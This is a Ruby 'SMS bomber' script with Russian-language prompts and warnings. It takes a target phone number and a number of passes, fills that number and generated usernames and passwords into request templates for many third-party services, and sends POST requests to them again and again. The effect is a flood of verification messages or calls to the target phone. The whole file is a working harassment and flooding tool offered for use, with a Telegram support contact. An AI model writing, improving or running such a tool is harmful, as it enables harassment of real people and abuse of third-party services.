# frozen_string_literal: true

require 'net/http'
require 'net/https'
require 'json'

def main
  response = config('response')
  json = config('json')
  debug = config('debug')
  put_debug "Show response: #{response}, show jsons: #{json}, debug: #{debug}"

  put_warning 'Бомбер тестировался только с российскими номерами, нет возможности проверить с украинскими'
  put_warning 'При возникновении любых ошибок пишите t.me/UpgradelifeT'

  phone = input('Введите номер(Пример: +79...): ').strip
  # phone without plus
  phone_np = phone.sub('+', '')

  cycles = input('Введите количество проходов: ').to_i
  put_debug "Phone: #{phone}, Phone without plus: #{phone_np}, cycles: #{cycles}"

  # get list services
  services = Dir['services/*.json']
  put_debug "Services paths: #{services}"

  # check all services
  services.size.times do |i|
    # get all jsons
    services[i] = File.read services[i]
    services[i] = JSON.parse services[i]

    # checks
    services[i] = substitute(services[i], '$phone', phone) if services[i]['params'].include? '$json'
    services[i] = substitute(services[i], '$phone_np', phone_np) if services[i]['params'].include? '$json'
    services[i] = substitute(services[i], '$password', gen_something) if services[i]['params'].include? '$password'
    services[i] = substitute(services[i], '$username', gen_something) if services[i]['params'].include? '$username'
    services[i]['url'] = services[i]['url'].gsub('$phone', phone) if services[i]['params'].include? '$url'
    services[i]['url'] = services[i]['url'].gsub('$phone_np', phone_np) if services[i]['params'].include? '$url'

    put_debug "Service json: #{services[i]}"
  end

  (1..cycles).each do |x|
    put_debug "Начинаю #{x} проход"
    services.size.times do |i|
      bomber(services[i], response)
    end
  end
end

def config(key)
  c = File.read 'config.json'
  c = JSON.parse c
  c[key]
end

def input(msg)
  print "\033[35m[Input] \033[0m#{msg}"
  gets
end

def put_anything(msg)
  puts "\033[34m[Output] \033[0m#{msg}"
end

def put_debug(msg)
  puts "\033[36m[Debug] \033[0m#{msg}" if config('debug')
end

def put_warning(msg)
  puts "\033[31m[Warning] \033[0m#{msg}"
end

def substitute(hash, target, new_value)
  hash.each do |key, value|
    hash[key] = new_value if value == target
    substitute(value, target, new_value) if value.is_a?(Hash)
  end
  hash
end

def bomber(hsh, response)
  uri = URI.parse(hsh['url'])
  https = Net::HTTP.new(uri.host, uri.port)
  https.use_ssl = true
  request = Net::HTTP::Post.new(uri.path)
  if hsh['params'].include? '$json'
    request['Content-Type'] = 'application/json'
    request.body = hsh['body'].to_json
  end
  result = https.request request
  if response
    if config('full_responses')
      put_debug "#{hsh['name']} response: #{result.body}"
    elsif result.body.size > 250
      put_anything "#{hsh['name']} response code: #{result.code}"
    else
      put_anything "#{hsh['name']} response: #{result.body}"
    end
  end
end

def gen_something
  vowels = "aeiouy".split('')
  consonants = "bcdfghjklmnpqrstvwxyz".split('')
  numbers = "1234567890".split('')
  something = ''

  (0..rand(10)).each do |r|
    something += vowels[rand(vowels.size)]
    something += consonants[rand(consonants.size)]
    something += numbers[rand(numbers.size)]
  end

  something
end


main
